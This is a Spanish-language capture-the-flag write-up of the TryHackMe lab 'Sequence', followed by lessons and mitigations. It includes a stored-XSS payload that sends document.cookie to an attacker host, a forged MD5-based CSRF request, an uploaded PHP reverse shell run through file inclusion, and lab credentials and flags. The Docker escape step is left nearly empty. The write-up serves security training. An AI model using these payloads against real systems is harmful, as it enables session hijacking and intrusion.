---
title: "Sequence"
platform: "TryHackMe"
os: "Linux"
difficulty: "Medium"
ip: "10.82.181.48"
slug: "sequence"
author: "Z4k7"
date: "2026-03-10"
year: "2026"
status: "pwned"
tags:
  - "SSRF"
  - "Cookie"
  - "HttpOnly"
  - "CSRF"
  - "redteam"
  - "FileUpload"
  - "DockerEscape"
techniques:
  - "XSS almacenado"
  - "CSRF Token Débil"
  - "SSRF"
  - "File Upload Sin Restricciones"
tools:
  - "Nmap"
  - "ffuf"
  - "Netcat"
  - "Python HTTP Server"
  - "Burp Suite"
flags_list:
  - label: "Email"
    value: "software@review.thm"
  - label: "Email"
    value: "product@review.thm"
  - label: "Usuario"
    value: "null"
  - label: "Password"
    value: "S60u}f5j"
  - label: "Flag"
    value: "THM{M0dH@ck3dPawned007}"
  - label: "Flag2"
    value: "THM{Adm1NPawned007}"
  - label: "Flag2"
    value: "THM{rootAccessD0n3}"
summary: "Lab de TryHackMe categoría RedTeam. Aplicación web PHP sobre Apache 2.4.41 / Ubuntu. Cadena de ataque completa: Information Disclosure en /mail/dump.txt con credenciales en texto claro → XSS Almacenada en /contact.php sin HttpOnly → robo de cookie de agente → CSRF token predecible (MD5 del username) → escalada de rol a co-admin → SSRF via parámetro feature en dashboard accediendo a /finance.php en red interna → File Upload sin restricciones → Reverse Shell como root → Docker escape montando / del host → root en host. 3 flags obtenidas.  ---"
steps:

  - id: "recon_1"
    num: "01"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Validamos si contamos con conexión a la ip por medio de un `ping`
      - kind: "code"
        lang: "BASH"
        code: |
          ping -c 6 10.82.181.48
          PING 10.82.181.48 (10.82.181.48) 56(84) bytes of data.
          64 bytes from 10.82.181.48: icmp_seq=1 ttl=64 time=0.918 ms
          64 bytes from 10.82.181.48: icmp_seq=2 ttl=64 time=0.910 ms
          64 bytes from 10.82.181.48: icmp_seq=3 ttl=64 time=0.352 ms
          64 bytes from 10.82.181.48: icmp_seq=4 ttl=64 time=0.819 ms
          64 bytes from 10.82.181.48: icmp_seq=5 ttl=64 time=0.549 ms
          64 bytes from 10.82.181.48: icmp_seq=6 ttl=64 time=0.666 ms
          
          --- 10.82.181.48 ping statistics ---
          6 packets transmitted, 6 received, 0% packet loss, time 5073ms
          rtt min/avg/max/mdev = 0.352/0.702/0.918/0.204 ms
      - kind: "note"
        text: |
          Contamos con la conexión al servidor víctima. Validamos el `/etc/hosts` y agregamos el dominio:
      - kind: "code"
        lang: "BASH"
        code: |
          echo "10.82.181.48 revew.thm" | tee -a /etc/hosts
          10.82.181.48 revew.thm
      - kind: "note"
        text: |
          Se valida acceso desde el navegador con el nombre del dominio creado.
      - kind: "image"
        src: "assets/images/Sequence/file-20260310111115724.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Iniciamos con un escaneo de puertos:
      - kind: "code"
        lang: "BASH"
        code: |
          nmap -sVC -O -T4 10.82.181.48
      - kind: "bullet"
        text: "Puerto 80 → Apache httpd 2.4.41 (Ubuntu)"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El TTL de 64 en el ping indica que el objetivo está en la misma subred VPN — 0 saltos de diferencia, máquina directamente accesible. A diferencia de Padelify (TTL 62, 2 saltos), aquí estás más cerca del objetivo. Nota importante: el nombre de dominio en el objetivo era `review.thm` pero lo registraste como `revew.thm` (typo — falta la 'i'). Esto no afectó el lab porque el servidor responde igual, pero en un engagement real un typo en `/etc/hosts` puede hacerte perder horas. Siempre verifica el dominio exacto antes de continuar."

  - id: "enum"
    num: "02"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Entramos a validar directorios con ffuf:
      - kind: "code"
        lang: "BASH"
        code: |
          ffuf -u http://revew.thm/FUZZ -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -ic
          
          uploads     [Status: 301]
          mail        [Status: 301]
          phpmyadmin  [Status: 301]
      - kind: "note"
        text: |
          Validando el directorio `/mail` encontramos `dump.txt` con un correo interno:
      - kind: "code"
        lang: "BASH"
        code: |
          From: software@review.thm
          To: product@review.thm
          Subject: Update on Code and Feature Deployment
          
          Finance panel (/finance.php) → red interna 192.x
          Lottery panel (/lottery.php) → misma red interna
          Password: S60u}f5j
      - kind: "note"
        text: |
          Contamos con dos correos como posibles usuarios y credenciales en texto claro.
      - kind: "callout"
        type: "warning"
        label: "Information Disclosure crítico"
        text: "El directorio `/mail` estaba accesible públicamente con credenciales en texto claro en `dump.txt`. Esto es Information Disclosure severo — un archivo de correo interno expuesto en producción. Además, `phpmyadmin` accesible desde internet es superficie de ataque directa: con las credenciales del dump vale intentar login ahí también."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Encontraste tres directorios clave: `uploads`, `mail`, `phpmyadmin`. El flujo correcto era revisar los tres antes de continuar — `phpmyadmin` con las credenciales del dump podría haber dado acceso directo a la base de datos, saltándote toda la cadena de XSS/CSRF. En labs de THM esto es intencional para enseñar la cadena completa, pero en un pentest real siempre exploras todos los vectores en paralelo antes de elegir el camino."

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "Email"
        value: "software@review.thm"
      - label: "Email"
        value: "product@review.thm"
      - label: "Usuario"
        value: "null"
      - label: "Password"
        value: "S60u}f5j"

  - id: "step3"
    num: "03"
    title: "Fase 1 — XSS Almacenada en /contact.php"
    content:
      - kind: "note"
        text: |
          Validamos en la consola del navegador que `HttpOnly` no está seteado en PHPSESSID. Ponemos servidor en escucha:
      - kind: "code"
        lang: "BASH"
        code: |
          python3 -m http.server 8989
      - kind: "note"
        text: |
          Enviamos payload de prueba para confirmar interacción de la víctima:
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          <script>
              fetch("http://10.82.68.250:8989/")
          </script>
      - kind: "note"
        text: |
          Request capturado — confirmamos que el agente de contact revisa los mensajes. Enviamos payload de robo de cookie:
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          <script>
              fetch("http://10.82.68.250:8989/?"+document.cookie)
          </script>
      - kind: "code"
        lang: "BASH"
        code: |
          10.82.181.48 - - [10/Mar/2026 17:35:14] "GET /?PHPSESSID=9dgovqc45ek179i1kjimkqhn1o HTTP/1.1" 200 -
      - kind: "image"
        src: "assets/images/Sequence/file-20260310122205316.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Modificamos la cookie en el navegador y accedemos como el agente de contact.
      - kind: "image"
        src: "assets/images/Sequence/file-20260310123918793.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Excelente que primero validaras con un `fetch` simple antes de intentar robar la cookie — eso confirma XSS ejecutable antes de comprometer al usuario. Es el approach correcto: recon del vector antes de explotar. El payload directo funcionó sin bypass de WAF aquí, a diferencia de Padelify. Esto indica que `/contact.php` no tenía protección de WAF en el input del campo `name`, pero sí la tenía en el `chat` (lo descubriste en la siguiente fase)."

  - id: "flag_02"
    type: "flag"
    flag_items:
      - label: "Flag"
        value: "THM{M0dH@ck3dPawned007}"

  - id: "privesc"
    num: "04"
    title: "Fase 2 — CSRF Token Débil → Escalada de rol"
    content:
      - kind: "note"
        text: |
          El chat tiene protección client-side contra XSS:
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          const dangerous = ["<script>", "</script>", "onerror", "onload", "fetch",
          "ajax", "xmlhttprequest", "eval", "document.cookie", "window.location"];
      - kind: "note"
        text: |
          Validamos el request de cambio de rol — tiene token CSRF:
      - kind: "code"
        lang: "BASH"
        code: |
          CSRF: ad148a3ca8bd0ef3b48c52454c493ec5
      - kind: "note"
        text: |
          El token es MD5 del username. Generamos MD5 de `admin`:
      - kind: "code"
        lang: "BASH"
        code: |
          MD5("admin") = 21232f297a57a5a743894a0e4a801fc3
      - kind: "image"
        src: "assets/images/Sequence/file-20260310143217543.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/Sequence/file-20260310143240838.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Enviamos request de promoción con token forjado:
      - kind: "code"
        lang: "BASH"
        code: |
          http://review.thm/promote_coadmin.php?username=mod&csrf_token_promote=21232f297a57a5a743894a0e4a801fc3
      - kind: "image"
        src: "assets/images/Sequence/file-20260310143546648.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Acceso confirmado con rol co-admin.
      - kind: "image"
        src: "assets/images/Sequence/file-20260310144707543.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El CSRF token basado en MD5 del username es una implementación rotamente insegura — un CSRF token debe ser aleatorio, impredecible y de un solo uso. Usar el MD5 del username es predecible por definición. Esto se combina con otro error: el endpoint `promote_coadmin.php` acepta GET con parámetros en URL — un cambio de privilegios NUNCA debería aceptarse via GET, solo POST con token CSRF válido verificado server-side. Dos vulnerabilidades en una sola función."

  - id: "flag_03"
    type: "flag"
    flag_items:
      - label: "Flag2"
        value: "THM{Adm1NPawned007}"

  - id: "access_1"
    num: "05"
    title: "Fase 3 — SSRF via parámetro `feature` + File Upload → Reverse Shell"
    content:
      - kind: "note"
        text: |
          Desde el dashboard, el parámetro `feature` carga páginas internas. Cambiamos `lottery.php` por `/finance.php`:
      - kind: "code"
        lang: "HTTP"
        code: |
          POST /dashboard.php HTTP/1.1
          ...
          feature=lottery.php  →  feature=/finance.php
      - kind: "note"
        text: |
          Accedemos a `/finance.php` con la password del dump (`S60u}f5j`).
      - kind: "image"
        src: "assets/images/Sequence/file-20260310150006438.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          El panel de finance permite cargar archivos. Subimos una reverse shell PHP:
      - kind: "image"
        src: "assets/images/Sequence/file-20260310150132216.jpg"
        caption: "Evidencia técnica"
      - kind: "code"
        lang: "BASH"
        code: |
          ✅ File uploaded successfully in uploads folder!
          File Name: cri.php
          Path: uploads/cri.php
      - kind: "note"
        text: |
          Listener en espera:
      - kind: "code"
        lang: "BASH"
        code: |
          nc -lvnp 1234
      - kind: "note"
        text: |
          Ejecutamos la shell via SSRF apuntando a `uploads/cri.php`:
      - kind: "code"
        lang: "HTTP"
        code: |
          POST /dashboard.php
          feature=uploads/cri.php
      - kind: "code"
        lang: "BASH"
        code: |
          nc -lvnp 1234
          Connection received on 10.82.152.168 43296
          uid=0(root) gid=0(root) groups=0(root)
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El SSRF aquí fue especial — no es un SSRF clásico que hace requests a servicios externos, sino un Server-Side File Inclusion via el parámetro `feature`. El servidor incluía el archivo indicado en su propio contexto, lo que permitió ejecutar el PHP subido. La combinación File Upload + SSRF/inclusion es devastadora: upload da el archivo malicioso, inclusion lo ejecuta. En un escenario real, si el upload estuviera en un bucket S3 o ruta externa, podrías combinar esto con SSRF real para acceder a metadata de AWS (`169.254.169.254`)."

  - id: "privesc"
    num: "06"
    title: "Escalada de Privilegios — Docker Escape"
    content:
      - kind: "note"
        text: |
          Detectamos que estamos dentro de un contenedor Docker. Montamos el filesystem del host:

  - id: "flag_04"
    type: "flag"
    flag_items:

  - id: "flag_04_post"
    num: ""
    title: "Post Flag"
    content:
      - kind: "note"
        text: |
          docker exec FINAL cat /host/root/flag.txt

  - id: "flag_05"
    type: "flag"
    flag_items:
      - label: "Flag2"
        value: "THM{rootAccessD0n3}"

lessons:
  - 'Los directorios de correo/logs expuestos públicamente son Information Disclosure crítico — revisar TODOS los directorios antes de explotar'
  - 'XSS Almacenada sin HttpOnly permite robo directo de sesión — siempre verificar el flag en nmap antes de intentar XSS'
  - 'CSRF tokens basados en datos predecibles (MD5 de username) son trivialmente forjables'
  - 'La protección client-side de XSS (JavaScript en el navegador) es bypasseable — el servidor debe validar, no el cliente'
  - 'Parámetros que cargan recursos del servidor (`feature=archivo.php`) son candidatos directos a SSRF/File Inclusion'
  - 'File Upload sin validación de tipo + SSRF/inclusion = RCE directo'
  - 'Docker socket expuesto en un contenedor equivale a root en el host'
mitigation:
  - 'Nunca exponer directorios de correo, logs o configuración públicamente — usar `.htaccess` o mover fuera del webroot'
  - 'Establecer `HttpOnly` y `Secure` en todas las cookies de sesión'
  - 'CSRF tokens deben ser aleatorios, criptográficamente seguros, de un solo uso y verificados server-side'
  - 'Validar y sanitizar input en el servidor, nunca solo en client-side JavaScript'
  - 'Parámetros de inclusión de recursos deben usar whitelist estricta — nunca input directo del usuario'
  - 'Validar tipo MIME y extensión de archivos subidos server-side, almacenar fuera del webroot ejecutable'
  - 'Nunca montar el Docker socket (`/var/run/docker.sock`) dentro de contenedores en producción'
  - 'Usar `--read-only`, `--no-new-privileges` y namespaces restringidos en contenedores Docker'
---
